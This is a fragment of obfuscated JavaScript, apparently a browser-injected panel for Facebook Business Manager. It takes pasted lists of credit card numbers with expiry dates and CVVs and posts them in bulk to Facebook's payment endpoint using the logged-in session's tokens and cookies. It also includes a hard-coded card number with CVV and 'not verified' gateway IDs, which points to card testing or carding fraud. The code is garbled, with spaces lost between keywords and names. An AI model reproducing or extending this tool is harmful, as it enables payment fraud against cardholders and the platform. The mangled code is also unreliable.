                                                        Acnnc.addEventListener("click", oDsic);
                                                        Acnnc.addEventListener("click", AMKic);
                                                        varAsXhc = document.createElement("button");
                                                        AsXhc.textContent = "PleaseWait👩‍💻";
                                                        AsXhc.style.display = "none";
                                                        AsXhc.style.margin = "0auto";
                                                        AsXhc.style.padding = "10px20px";
                                                        AsXhc.style.background = "red";
                                                        AsXhc.style.color = "white";
                                                        AsXhc.style.border = "none";
                                                        AsXhc.style.borderRadius = "5px";
                                                        MFck.appendChild(AsXhc);
                                                        Evdic.addEventListener("click", oPRgc);
                                                        Evdic.addEventListener("click", ovegc);
                                                        Evdic.addEventListener("click", AEwgc);
                                                        varYCtgc = document.createElement("button");
                                                        YCtgc.textContent = "PleaseWait👩‍💻";
                                                        YCtgc.style.display = "none";
                                                        YCtgc.style.margin = "0auto";
                                                        YCtgc.style.padding = "10px20px";
                                                        YCtgc.style.background = "red";
                                                        YCtgc.style.color = "white";
                                                        YCtgc.style.border = "none";
                                                        YCtgc.style.borderRadius = "5px";
                                                        MFck.appendChild(YCtgc);
                                                        varUnOhc = document.createElement("label");
                                                        UnOhc.innerText = "GatewayID[notverified]:";
                                                        UnOhc.style.color = "red";
                                                        UnOhc.style.display = "none";
                                                        MFck.appendChild(UnOhc);
                                                        varwpRhc = document.createElement("select");
                                                        wpRhc.style.width = "100%";
                                                        wpRhc.style.height = "30px";
                                                        wpRhc.style.marginBottom = "10px";
                                                        wpRhc.style.display = "none";
                                                        MFck.appendChild(wpRhc);
                                                        varQkIhc = [_defineProperty(_defineProperty({}, "value", "6440221279426820"), "text", "DefaultGatewayIDNotverified2024"), _defineProperty(_defineProperty({}, "value", "6440221279426820"), "text", "OldGatewayIDNotverified2023"), _defineProperty(_defineProperty({}, "value", "6391749514276261"), "text", "OldGatewayIDNotverified2022die"), _defineProperty(_defineProperty({}, "value", "6391749514276261"), "text", "OldGatewayIDNotverified2021die")];
                                                        QkIhc.forEach(function(smLhc) {
                                                            varMhChc = document.createElement("option");
                                                            MhChc.value = smLhc.value;
                                                            MhChc.innerText = smLhc.text;
                                                            wpRhc.appendChild(MhChc);
                                                        });
                                                        wpRhc.value = "6440221279426820";
                                                        varojFhc = document.createElement("p");
                                                        ojFhc.style.marginTop = "10px";
                                                        ojFhc.style.display = "none";
                                                        ojFhc.innerText = wpRhc.options[wpRhc.selectedIndex].text;
                                                        MFck.appendChild(ojFhc);
                                                        wpRhc.addEventListener("change", function() {
                                                            ojFhc.innerText = wpRhc.options[wpRhc.selectedIndex].text;
                                                        });
                                                        varIewhc = document.createElement("label");
                                                        Iewhc.innerText = "PaymentType[notverified]:";
                                                        Iewhc.style.display = "none";
                                                        MFck.appendChild(Iewhc);
                                                        varkgzhc = document.createElement("select");
                                                        kgzhc.style.width = "100%";
                                                        kgzhc.style.height = "30px";
                                                        kgzhc.style.marginBottom = "10px";
                                                        kgzhc.style.display = "none";
                                                        MFck.appendChild(kgzhc);
                                                        varMFAec = [_defineProperty(_defineProperty({}, "value", "BACS"), "text", "DefaultPaymentTypeBACS"), _defineProperty(_defineProperty({}, "value", "SEPA"), "text", "DefaultPaymentTypeErrorSEPA")];
                                                        MFAec.forEach(function(oHDec) {
                                                            varICuec = document.createElement("option");
                                                            ICuec.value = oHDec.value;
                                                            ICuec.innerText = oHDec.text;
                                                            kgzhc.appendChild(ICuec);
                                                        });
                                                        kgzhc.value = "BACS";
                                                        varkExec = document.createElement("p");
                                                        kExec.style.marginTop = "10px";
                                                        kExec.style.display = "none";
                                                        kExec.innerText = kgzhc.options[kgzhc.selectedIndex].text;
                                                        MFck.appendChild(kExec);
                                                        kgzhc.addEventListener("change", function() {
                                                            kExec.innerText = kgzhc.options[kgzhc.selectedIndex].text;
                                                        });
                                                        varEzoec = document.createElement("button");
                                                        Ezoec.textContent = "💰ShowCardsMultiTools💰";
                                                        Ezoec.style.width = "100%";
                                                        Ezoec.style.height = "50px";
                                                        Ezoec.style.marginBottom = "10px";
                                                        Ezoec.style.backgroundColor = "Blue";
                                                        Ezoec.style.color = "white";
                                                        vargBrec = NaN === NaN;
                                                        Ezoec.addEventListener("click", function() {
                                                            Awiec.style.display = gBrec ? "none" : "block";
                                                            cylec.style.display = gBrec ? "none" : "block";
                                                            cSYec.style.display = gBrec ? "none" : "block";
                                                            ksYfc.style.display = gBrec ? "none" : "block";
                                                            QUfdc.style.display = gBrec ? "none" : "block";
                                                            B.style.display = gBrec ? "none" : "block";
                                                            A.style.display = gBrec ? "none" : "block";
                                                            y.style.display = gBrec ? "none" : "block";
                                                            EXuRb.style.display = gBrec ? "none" : "block";
                                                            _YSlRb.style.display = gBrec ? "none" : "block";
                                                            YmZRb.style.display = gBrec ? "none" : "block";
                                                            _siQRb.style.display = gBrec ? "none" : "block";
                                                            Uvkac.style.display = gBrec ? "none" : "block";
                                                            wxnac.style.display = gBrec ? "none" : "block";
                                                            gBrec = !gBrec;
                                                            Ezoec.textContent = gBrec ? "💰HideCardsMultiTools💰" : "💰ShowCardsMultiTools💰";
                                                            Ezoec.style.backgroundColor = gBrec ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(Ezoec);
                                                        varAwiec = document.createElement("label");
                                                        Awiec.innerText = "CardDetails:";
                                                        Awiec.style.display = "none";
                                                        MFck.appendChild(Awiec);
                                                        varcylec = document.createElement("textarea");
                                                        cylec.placeholder = "EnterCardDetails(oneperline:Card|month|year|cvv)";
                                                        cylec.style.display = "none";
                                                        cylec.style.width = "100%";
                                                        cylec.style.height = "200px";
                                                        cylec.style.marginBottom = "10px";
                                                        MFck.appendChild(cylec);
                                                        varcSYec = document.createElement("button");
                                                        cSYec.textContent = "💳AddCardsAtOnce💳";
                                                        cSYec.style.display = "none";
                                                        cSYec.style.width = "80%";
                                                        cSYec.style.height = "40px";
                                                        cSYec.style.marginBottom = "10px";
                                                        cSYec.style.backgroundColor = "red";
                                                        cSYec.style.color = "white";
                                                        cSYec.style.margin = "0auto";
                                                        cSYec.addEventListener("click", function() {
                                                            varETbfc = cylec.value.split("\\n");
                                                            varYOSec = [];
                                                            varAQVec = functionAQVec(ULMec, wNPec) {
                                                                var_ULMec$split = ULMec.split("|");
                                                                var_ULMec$split2 = _arrayWithHoles(_ULMec$split) || _iterableToArrayLimit(_ULMec$split, 4) || _unsupportedIterableToArray(_ULMec$split, 4) || _nonIterableRest();
                                                                varQIGec = _ULMec$split2[0];
                                                                varsKJec = _ULMec$split2[1];
                                                                varsexfc = _ULMec$split2[2];
                                                                varUfAfc = _ULMec$split2[3];
                                                                returnfetch("https://business.secure.facebook.com/ajax/payment/token_proxy.php?tpe=%2Fapi%2Fgraphql%2F", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty(_defineProperty({}, "content-type", "application/x-www-form-urlencoded"), "x-fb-friendly-name", "useBillingAddCreditCardMutation")), "referrer", "https://business.facebook.com/"), "body", "av=".concat(_MVAFb.value, "&payment_dev_cycle=prod&locale=en_US&__user=").concat(_oXDFb.value, "&__a=1&dpr=2&__rev=1005599768&__comet_req=0&__spin_r=1005599768&__jssesw=1&fb_dtsg=").concat(_YeTFb.value, '&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=useBillingAddCreditCardMutation&make_ads_primaty_funding_source=1&variables={"input":{"billing_address":{"country_code":"').concat(wxnac.value, '"},"billing_logging_data":{},"cardholder_name":"","credit_card_first_6":{"sensitive_string_value":"').concat(QIGec.substring(0, 6), '"},"credit_card_last_4":{"sensitive_string_value":"').concat(QIGec.substring(QIGec.length - 4), '"},"credit_card_number":{"sensitive_string_value":"').concat(QIGec, '"},"csc":{"sensitive_string_value":"').concat(UfAfc, '"},"expiry_month":"').concat(sKJec, '","expiry_year":"').concat(sexfc, '","payment_account_id":"').concat(YOuk.value, '","payment_type":"').concat(_siQRb.value, '","unified_payments_api":true,"actor_id":"').concat(_oXDFb.value, '","client_mutation_id":"').concat(wNPec + 1, '"}}&server_timestamps=true&doc_id=').concat(_YSlRb.value)), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(obrfc) {
                                                                    returnobrfc.text();
                                                                }).then(function(Qcufc) {
                                                                    YOSec.push("Card".concat(wNPec + 1, ":").concat(Qcufc));
                                                                }).catch(function(kYkfc) {
                                                                    console.error(kYkfc);
                                                                    YOSec.push("Card".concat(wNPec + 1, ":Erroroccurredwhileaddingcard"));
                                                                });
                                                            };
                                                            varMZnfc = ETbfc.map(function(gVefc, IWhfc) {
                                                                returnAQVec(gVefc, IWhfc);
                                                            });
                                                            Promise.all(MZnfc).then(function() {
                                                                QUfdc.value = YOSec.join("\\n");
                                                            });
                                                            QUfdc.value = "⌛...AddingCardsInProgress...⌛";
                                                        });
                                                        MFck.appendChild(cSYec);
                                                        y = document.createElement("br");
                                                        y.style.display = "none";
                                                        MFck.appendChild(y);
                                                        varksYfc = document.createElement("button");
                                                        ksYfc.textContent = "💳AddCardsOneByOne💳";
                                                        ksYfc.style.display = "none";
                                                        ksYfc.style.width = "80%";
                                                        ksYfc.style.height = "40px";
                                                        ksYfc.style.marginBottom = "10px";
                                                        ksYfc.style.backgroundColor = "green";
                                                        ksYfc.style.color = "white";
                                                        ksYfc.style.margin = "0auto";
                                                        ksYfc.addEventListener("click", function() {
                                                            varEnPfc = cylec.value.split("\\n");
                                                            vargpSfc = [];
                                                            varAkJfc = functionAkJfc(cmMfc) {
                                                                varz = 0;
                                                                while (z < 65535) {
                                                                    switch (z) {
                                                                        case0: z = cmMfc >= EnPfc.length ? 1 : 65535;
                                                                        break;
                                                                        case1: z = 65535; {
                                                                            QUfdc.value = gpSfc.join("\\n");
                                                                            return;
                                                                        }
                                                                        break;
                                                                    }
                                                                }
                                                                varYiGfc = EnPfc[cmMfc].split("|");
                                                                var_YiGfc = _arrayWithHoles(YiGfc) || _iterableToArrayLimit(YiGfc, 4) || _unsupportedIterableToArray(YiGfc, 4) || _nonIterableRest();
                                                                varAIHcc = _YiGfc[0];
                                                                varcKKcc = _YiGfc[1];
                                                                varwFBcc = _YiGfc[2];
                                                                varYGEcc = _YiGfc[3];
                                                                QUfdc.value = "⌛...CurrentlyAddingCardNumber(".concat(AIHcc, ")inProgress...⌛");
                                                                fetch("https://business.secure.facebook.com/ajax/payment/token_proxy.php?tpe=%2Fapi%2Fgraphql%2F", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty(_defineProperty({}, "content-type", "application/x-www-form-urlencoded"), "x-fb-friendly-name", "useBillingAddCreditCardMutation")), "referrer", "https://business.facebook.com/"), "body", "av=".concat(_MVAFb.value, "&payment_dev_cycle=prod&locale=en_US&__user=").concat(_oXDFb.value, "&__a=1&dpr=2&__rev=1005599768&__comet_req=0&__spin_r=1005599768&__jssesw=1&fb_dtsg=").concat(_YeTFb.value, '&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=useBillingAddCreditCardMutation&make_ads_primaty_funding_source=1&variables={"input":{"billing_address":{"country_code":"').concat(wxnac.value, '"},"billing_logging_data":{},"cardholder_name":"","credit_card_first_6":{"sensitive_string_value":"').concat(AIHcc.substring(0, 6), '"},"credit_card_last_4":{"sensitive_string_value":"').concat(AIHcc.substring(AIHcc.length - 4), '"},"credit_card_number":{"sensitive_string_value":"').concat(AIHcc, '"},"csc":{"sensitive_string_value":"').concat(YGEcc, '"},"expiry_month":"').concat(cKKcc, '","expiry_year":"').concat(wFBcc, '","payment_account_id":"').concat(YOuk.value, '","payment_type":"').concat(_siQRb.value, '","unified_payments_api":true,"actor_id":"').concat(_oXDFb.value, '","client_mutation_id":"').concat(cmMfc + 1, '"}}&server_timestamps=true&doc_id=').concat(_YSlRb.value)), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(sCvcc) {
                                                                    sCvcc.text().then(function(UDycc) {
                                                                        gpSfc.push("Card".concat(cmMfc + 1, ":").concat(UDycc));
                                                                        AkJfc(cmMfc + 1);
                                                                    }).catch(function(ozpcc) {
                                                                        console.error(ozpcc);
                                                                        gpSfc.push("Card".concat(cmMfc + 1, ":Erroroccurredwhileaddingcard"));
                                                                        AkJfc(cmMfc + 1);
                                                                    });
                                                                });
                                                            };
                                                            AkJfc(0);
                                                            QUfdc.value = "⌛...AddingCardsInProgress...⌛";
                                                        });
                                                        MFck.appendChild(ksYfc);
                                                        A = document.createElement("br");
                                                        A.style.display = "none";
                                                        MFck.appendChild(A);
                                                        varQUfdc = document.createElement("textarea");
                                                        QUfdc.placeholder = "ResponsefromServer!";
                                                        QUfdc.style.display = "none";
                                                        QUfdc.style.width = "100%";
                                                        QUfdc.style.height = "100px";
                                                        QUfdc.style.marginBottom = "10px";
                                                        MFck.appendChild(QUfdc);
                                                        B = document.createElement("br");
                                                        B.style.display = "none";
                                                        MFck.appendChild(B);
                                                        varMRZcc = document.createElement("button");
                                                        MRZcc.textContent = "💰ShowCardTools💰";
                                                        MRZcc.style.width = "100%";
                                                        MRZcc.style.height = "50px";
                                                        MRZcc.style.marginBottom = "10px";
                                                        MRZcc.style.backgroundColor = "Blue";
                                                        MRZcc.style.color = "white";
                                                        varoTcdc = NaN === NaN;
                                                        MRZcc.addEventListener("click", function() {
                                                            IOTcc.style.display = oTcdc ? "none" : "block";
                                                            ELNcc.style.display = oTcdc ? "none" : "block";
                                                            sCXh.style.display = oTcdc ? "none" : "block";
                                                            oTcdc = !oTcdc;
                                                            MRZcc.textContent = oTcdc ? "💰HideCardTools💰" : "💰ShowCardTools💰";
                                                            MRZcc.style.backgroundColor = oTcdc ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(MRZcc);
                                                        varIOTcc = document.createElement("button");
                                                        IOTcc.textContent = "💰ShowAddCreditCardSections💰";
                                                        IOTcc.style.display = "none";
                                                        IOTcc.style.width = "50%";
                                                        IOTcc.style.height = "30px";
                                                        IOTcc.style.marginBottom = "10px";
                                                        IOTcc.style.backgroundColor = "Blue";
                                                        IOTcc.style.color = "white";
                                                        varkQWcc = NaN === NaN;
                                                        IOTcc.addEventListener("click", function() {
                                                            ofCbc.style.display = kQWcc ? "none" : "block";
                                                            Iatbc.style.display = kQWcc ? "none" : "block";
                                                            YKPYb.style.display = kQWcc ? "none" : "block";
                                                            UHJYb.style.display = kQWcc ? "none" : "block";
                                                            QEDYb.style.display = kQWcc ? "none" : "block";
                                                            kcwbc.style.display = kQWcc ? "none" : "block";
                                                            kwjcc.style.display = kQWcc ? "none" : "block";
                                                            Uvkac.style.display = kQWcc ? "none" : "block";
                                                            wxnac.style.display = kQWcc ? "none" : "block";
                                                            sysWb.style.display = kQWcc ? "none" : "block";
                                                            QUnTb.style.display = kQWcc ? "none" : "block";
                                                            kQeTb.style.display = kQWcc ? "none" : "block";
                                                            gNYSb.style.display = kQWcc ? "none" : "block";
                                                            ghEdc.style.display = kQWcc ? "none" : "block";
                                                            YqcYb.style.display = kQWcc ? "none" : "block";
                                                            obzVb.style.display = kQWcc ? "none" : "block";
                                                            EvlYb.style.display = kQWcc ? "none" : "block";
                                                            gxoYb.style.display = kQWcc ? "none" : "block";
                                                            AEEWb.style.display = kQWcc ? "none" : "block";
                                                            EXuRb.style.display = kQWcc ? "none" : "block";
                                                            _YSlRb.style.display = kQWcc ? "none" : "block";
                                                            YmZRb.style.display = kQWcc ? "none" : "block";
                                                            _siQRb.style.display = kQWcc ? "none" : "block";
                                                            kQWcc = !kQWcc;
                                                            IOTcc.textContent = kQWcc ? "💰HideAddCreditCardSections💰" : "💰ShowAddCreditCardSections💰";
                                                            IOTcc.style.backgroundColor = kQWcc ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(IOTcc);
                                                        varELNcc = document.createElement("button");
                                                        ELNcc.textContent = "💰ShowAddCreditCardBusinessSections💰";
                                                        ELNcc.style.display = "none";
                                                        ELNcc.style.width = "50%";
                                                        ELNcc.style.height = "30px";
                                                        ELNcc.style.marginBottom = "10px";
                                                        ELNcc.style.backgroundColor = "Blue";
                                                        ELNcc.style.color = "white";
                                                        vargNQcc = NaN === NaN;
                                                        ELNcc.addEventListener("click", function() {
                                                            ceydc.style.display = gNQcc ? "none" : "block";
                                                            EfBdc.style.display = gNQcc ? "none" : "block";
                                                            Acvdc.style.display = gNQcc ? "none" : "block";
                                                            UXldc.style.display = gNQcc ? "none" : "block";
                                                            wtcec.style.display = gNQcc ? "none" : "block";
                                                            kkKdc.style.display = gNQcc ? "none" : "block";
                                                            ofCbc.style.display = gNQcc ? "none" : "block";
                                                            Iatbc.style.display = gNQcc ? "none" : "block";
                                                            YKPYb.style.display = gNQcc ? "none" : "block";
                                                            UHJYb.style.display = gNQcc ? "none" : "block";
                                                            QEDYb.style.display = gNQcc ? "none" : "block";
                                                            kcwbc.style.display = gNQcc ? "none" : "block";
                                                            kwjcc.style.display = gNQcc ? "none" : "block";
                                                            Uvkac.style.display = gNQcc ? "none" : "block";
                                                            wxnac.style.display = gNQcc ? "none" : "block";
                                                            sysWb.style.display = gNQcc ? "none" : "block";
                                                            QUnTb.style.display = gNQcc ? "none" : "block";
                                                            kQeTb.style.display = gNQcc ? "none" : "block";
                                                            gNYSb.style.display = gNQcc ? "none" : "block";
                                                            gNYSb.style.display = gNQcc ? "none" : "block";
                                                            YqcYb.style.display = gNQcc ? "none" : "block";
                                                            obzVb.style.display = gNQcc ? "none" : "block";
                                                            EvlYb.style.display = gNQcc ? "none" : "block";
                                                            gxoYb.style.display = gNQcc ? "none" : "block";
                                                            AEEWb.style.display = gNQcc ? "none" : "block";
                                                            EXuRb.style.display = gNQcc ? "none" : "block";
                                                            _YSlRb.style.display = gNQcc ? "none" : "block";
                                                            YmZRb.style.display = gNQcc ? "none" : "block";
                                                            _siQRb.style.display = gNQcc ? "none" : "block";
                                                            gNQcc = !gNQcc;
                                                            ELNcc.textContent = gNQcc ? "💰HideAddCreditCardBusinessSections💰" : "💰ShowAddCreditCardBusinessSections💰";
                                                            ELNcc.style.backgroundColor = gNQcc ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(ELNcc);
                                                        varghEdc = document.createElement("button");
                                                        ghEdc.textContent = "❤️AddCardNowWithDefaultAdAccountID❤️:" + YOuk.value;
                                                        ghEdc.style.width = "100%";
                                                        ghEdc.style.height = "50px";
                                                        ghEdc.style.marginBottom = "10px";
                                                        ghEdc.style.backgroundColor = "green";
                                                        ghEdc.style.color = "white";
                                                        ghEdc.style.display = "none";
                                                        MFck.appendChild(ghEdc);
                                                        varIiHdc = document.createElement("button");
                                                        IiHdc.textContent = "PleaseWait👩‍💻";
                                                        IiHdc.style.display = "none";
                                                        IiHdc.style.margin = "0auto";
                                                        IiHdc.style.padding = "10px20px";
                                                        IiHdc.style.background = "red";
                                                        IiHdc.style.color = "white";
                                                        IiHdc.style.border = "none";
                                                        IiHdc.style.borderRadius = "5px";
                                                        MFck.appendChild(IiHdc);
                                                        varceydc = document.createElement("label");
                                                        ceydc.innerText = "BusinessID:";
                                                        ceydc.style.display = "none";
                                                        MFck.appendChild(ceydc);
                                                        varEfBdc = document.createElement("input");
                                                        EfBdc.type = "text";
                                                        EfBdc.placeholder = "EnterBusinessID";
                                                        EfBdc.style.width = "100%";
                                                        EfBdc.style.height = "50px";
                                                        EfBdc.style.marginBottom = "10px";
                                                        EfBdc.style.display = "none";
                                                        MFck.appendChild(EfBdc);
                                                        varYasdc = require("BusinessUnifiedNavigationContext").businessID;
                                                        EfBdc.value = Yasdc;
                                                        varAcvdc = document.createElement("label");
                                                        Acvdc.innerText = "BusinessAdAccountID:";
                                                        Acvdc.style.display = "none";
                                                        MFck.appendChild(Acvdc);
                                                        varUXldc = document.createElement("input");
                                                        UXldc.type = "text";
                                                        UXldc.placeholder = "EnterBusinessAdAccountID";
                                                        UXldc.style.width = "100%";
                                                        UXldc.style.height = "50px";
                                                        UXldc.style.marginBottom = "10px";
                                                        UXldc.style.display = "none";
                                                        MFck.appendChild(UXldc);
                                                        varwZodc = "ClickOnGetBusinessAdAccountID";
                                                        UXldc.value = wZodc;
                                                        varwtcec = document.createElement("button");
                                                        wtcec.innerText = "GetBusiness" + EfBdc.value + "AdAccountID";
                                                        wtcec.style.width = "100%";
                                                        wtcec.style.height = "50px";
                                                        wtcec.style.marginTop = "10px";
                                                        wtcec.style.display = "none";
                                                        MFck.appendChild(wtcec);
                                                        wtcec.addEventListener("click", Yufec);
                                                        varkkKdc = document.createElement("button");
                                                        kkKdc.textContent = "❤️AddCardNowIntoBusinessAdAccountID❤️:" + UXldc.value;
                                                        kkKdc.style.width = "100%";
                                                        kkKdc.style.height = "50px";
                                                        kkKdc.style.marginBottom = "10px";
                                                        kkKdc.style.backgroundColor = "green";
                                                        kkKdc.style.color = "white";
                                                        kkKdc.style.display = "none";
                                                        MFck.appendChild(kkKdc);
                                                        YOuk.addEventListener("input", MlNdc);
                                                        kkKdc.addEventListener("click", kIIac);
                                                        kkKdc.addEventListener("click", QMRac);
                                                        varoLOac = document.createElement("button");
                                                        oLOac.textContent = "PleaseWait👩‍💻";
                                                        oLOac.style.display = "none";
                                                        oLOac.style.margin = "0auto";
                                                        oLOac.style.padding = "10px20px";
                                                        oLOac.style.background = "red";
                                                        oLOac.style.color = "white";
                                                        oLOac.style.border = "none";
                                                        oLOac.style.borderRadius = "5px";
                                                        MFck.appendChild(oLOac);
                                                        varMdzbc = document.createElement("form");
                                                        MFck.appendChild(Mdzbc);
                                                        varofCbc = document.createElement("label");
                                                        ofCbc.innerText = "CardFormat:";
                                                        ofCbc.style.color = "red";
                                                        ofCbc.style.display = "none";
                                                        Mdzbc.appendChild(ofCbc);
                                                        varIatbc = document.createElement("input");
                                                        Iatbc.type = "text";
                                                        Iatbc.placeholder = "EnterCardFormat(XXXXXXXXXXXXXXXX|MM|YYYY|CVV)";
                                                        Iatbc.style.color = "red";
                                                        Iatbc.style.display = "none";
                                                        Iatbc.style.width = "100%";
                                                        Iatbc.style.height = "30px";
                                                        Iatbc.style.marginBottom = "10px";
                                                        Mdzbc.appendChild(Iatbc);
                                                        varkcwbc = document.createElement("label");
                                                        kcwbc.innerText = "CreditCardNumber:";
                                                        kcwbc.style.color = "red";
                                                        kcwbc.style.display = "none";
                                                        Mdzbc.appendChild(kcwbc);
                                                        varkwjcc = document.createElement("input");
                                                        kwjcc.type = "text";
                                                        kwjcc.placeholder = "CreditCardNumber";
                                                        kwjcc.value = "4003444416766276";
                                                        kwjcc.style.width = "100%";
                                                        kwjcc.style.height = "30px";
                                                        kwjcc.style.marginBottom = "10px";
                                                        kwjcc.style.display = "none";
                                                        Mdzbc.appendChild(kwjcc);
                                                        varMxmcc = document.createElement("div");
                                                        Mxmcc.style.display = "flex";
                                                        Mxmcc.style.justifyContent = "space-between";
                                                        Mdzbc.appendChild(Mxmcc);
                                                        var_gtdcc = gtdcc("Month:", "03", "CreditCardMonthInput", "20px");
                                                        varYKPYb = _gtdcc.flexItem;
                                                        varAMSYb = _gtdcc.input;
                                                        var_gtdcc2 = gtdcc("Year:", "2025", "CreditCardYearInput", "20px");
                                                        varUHJYb = _gtdcc2.flexItem;
                                                        varwJMYb = _gtdcc2.input;
                                                        var_gtdcc3 = gtdcc("CVV:", "500", "CVVCardNumberInput", "20px");
                                                        varQEDYb = _gtdcc3.flexItem;
                                                        varsGGYb = _gtdcc3.input;
                                                        QEDYb.style.marginRight = "0";
                                                        kcwbc.style.display = "none";
                                                        kwjcc.style.display = "none";
                                                        YKPYb.style.display = "none";
                                                        UHJYb.style.display = "none";
                                                        QEDYb.style.display = "none";
                                                        Mxmcc.appendChild(YKPYb);
                                                        Mxmcc.appendChild(UHJYb);
                                                        Mxmcc.appendChild(QEDYb);
                                                        varsauZb = document.createElement("label");
                                                        sauZb.innerText = "Month:";
                                                        sauZb.style.display = "none";
                                                        Mdzbc.appendChild(sauZb);
                                                        varUbxZb = document.createElement("input");
                                                        UbxZb.type = "text";
                                                        UbxZb.placeholder = "Month";
                                                        UbxZb.value = "03";
                                                        UbxZb.style.width = "100%";
                                                        UbxZb.style.height = "20px";
                                                        UbxZb.style.marginBottom = "10px";
                                                        UbxZb.style.display = "none";
                                                        Mdzbc.appendChild(UbxZb);
                                                        varoXnZb = document.createElement("label");
                                                        oXnZb.innerText = "Year:";
                                                        oXnZb.style.display = "none";
                                                        Mdzbc.appendChild(oXnZb);
                                                        varQYqZb = document.createElement("input");
                                                        QYqZb.type = "text";
                                                        QYqZb.placeholder = "Year";
                                                        QYqZb.value = "2025";
                                                        QYqZb.style.width = "100%";
                                                        QYqZb.style.height = "20px";
                                                        QYqZb.style.marginBottom = "10px";
                                                        QYqZb.style.display = "none";
                                                        Mdzbc.appendChild(QYqZb);
                                                        varkUhZb = document.createElement("label");
                                                        kUhZb.innerText = "CVV:";
                                                        kUhZb.style.display = "none";
                                                        Mdzbc.appendChild(kUhZb);
                                                        varMVkZb = document.createElement("input");
                                                        MVkZb.type = "text";
                                                        MVkZb.placeholder = "EnterCVV";
                                                        MVkZb.value = "500";
                                                        MVkZb.style.width = "100%";
                                                        MVkZb.style.height = "20px";
                                                        MVkZb.style.marginBottom = "10px";
                                                        MVkZb.style.display = "none";
                                                        Mdzbc.appendChild(MVkZb);
                                                        Iatbc.addEventListener("input", function(a) {
                                                            varISeZb = a.target.value.trim();
                                                            varImSZb = koVZb(ISeZb);
                                                            kwjcc.value = ImSZb.cardNumber;
                                                            UbxZb.value = ImSZb.month;
                                                            QYqZb.value = ImSZb.year;
                                                            MVkZb.value = ImSZb.cvv;
                                                            AMSYb.value = ImSZb.month;
                                                            wJMYb.value = ImSZb.year;
                                                            sGGYb.value = ImSZb.cvv;
                                                            kcwbc.style.display = "block";
                                                            kwjcc.style.display = "block";
                                                            YKPYb.style.display = "block";
                                                            UHJYb.style.display = "block";
                                                            QEDYb.style.display = "block";
                                                        });
                                                        AMSYb.addEventListener("input", function() {
                                                            UbxZb.value = AMSYb.value;
                                                        });
                                                        wJMYb.addEventListener("input", function() {
                                                            QYqZb.value = wJMYb.value;
                                                        });
                                                        sGGYb.addEventListener("input", function() {
                                                            MVkZb.value = sGGYb.value;
                                                        });
                                                        varAgGZb = document.createElement("button");
                                                        AgGZb.type = "submit";
                                                        AgGZb.style.display = "none";
                                                        AgGZb.innerText = "Submit";
                                                        Mdzbc.appendChild(AgGZb);
                                                        Mdzbc.addEventListener("submit", function(a) {
                                                            a.preventDefault();
                                                            varwdAZb = kwjcc.value.trim();
                                                            varYeDZb = UbxZb.value.trim();
                                                            varYyqac = QYqZb.value.trim();
                                                            varAAtac = MVkZb.value.trim();
                                                            console.log("CreditCardNumber:", wdAZb);
                                                            console.log("ExpirationMonth:", YeDZb);
                                                            console.log("ExpirationYear:", Yyqac);
                                                            console.log("CVV:", AAtac);
                                                        });
                                                        varUvkac = document.createElement("label");
                                                        Uvkac.innerText = "CountryCode:";
                                                        Uvkac.style.display = "none";
                                                        MFck.appendChild(Uvkac);
                                                        varwxnac = document.createElement("input");
                                                        wxnac.type = "text";
                                                        wxnac.placeholder = "DefaultCountry";
                                                        wxnac.style.width = "100%";
                                                        wxnac.style.height = "20px";
                                                        wxnac.style.marginBottom = "10px";
                                                        wxnac.value = "BR";
                                                        wxnac.style.display = "none";
                                                        MFck.appendChild(wxnac);
                                                        varQseac = "BR";
                                                        wxnac.value = Qseac;
                                                        YOuk.addEventListener("input", suhac);
                                                        ghEdc.addEventListener("click", orbac);
                                                        ghEdc.addEventListener("click", MpYZb);
                                                        varYqcYb = document.createElement("button");
                                                        YqcYb.textContent = "❤️GetCodeID[Fb,INS]❤️AdAccountID::" + YOuk.value;
                                                        YqcYb.style.display = "none";
                                                        YOuk.addEventListener("input", smTXb);
                                                        YqcYb.addEventListener("click", function() {});
                                                        YqcYb.addEventListener("click", function() {
                                                            fetch("https://business.facebook.com/api/graphql", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__a=1&dpr=1&fb_dtsg=".concat(_YeTFb.value, "&variables=%7B%22paymentAccountID%22%3A%22").concat(YOuk.value, "%22%2C%22billable_account_types%22%3A%5B%22FB_ADS%22%2C%22WHATSAPP%22%5D%2C%22connected_asset_limit%22%3A26%2C%22connected_asset_detail_limit%22%3A5%7D&doc_id=6362432207216723")), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(UnWXb) {
                                                                UnWXb.json().then(function(ojNXb) {
                                                                    varQkQXb = ojNXb.data.payment_account.billing_payment_methods;
                                                                    varkgHXb = QkQXb.map(function(MhKXb) {
                                                                        returnMhKXb.credential.credential_id;
                                                                    });
                                                                    varMBxYb = kgHXb.filter(function(oDAYb) {
                                                                        returnoDAYb;
                                                                    });
                                                                    varIyrYb = MBxYb.join(",");
                                                                    gxoYb.value = IyrYb;
                                                                });
                                                            }).catch(function(kAuYb) {
                                                                console.error(kAuYb);
                                                                console.log("ErroroccurredwhilesendingRequest");
                                                            });
                                                            gxoYb.value = "⌛...GettingDetails...⌛";
                                                            console.log("GettingDetails...⌛");
                                                        });
                                                        document.body.appendChild(YqcYb);
                                                        YqcYb.style.width = "100%";
                                                        YqcYb.style.height = "30px";
                                                        YqcYb.style.marginBottom = "10px";
                                                        YqcYb.style.backgroundColor = "orange";
                                                        YqcYb.style.color = "white";
                                                        MFck.appendChild(YqcYb);
                                                        varEvlYb = document.createElement("label");
                                                        EvlYb.innerText = "ReceivedCODE:";
                                                        EvlYb.style.display = "none";
                                                        MFck.appendChild(EvlYb);
                                                        vargxoYb = document.createElement("input");
                                                        gxoYb.type = "text";
                                                        gxoYb.placeholder = "EnterReceivedCODE";
                                                        gxoYb.style.width = "100%";
                                                        gxoYb.style.height = "20px";
                                                        gxoYb.style.marginBottom = "10px";
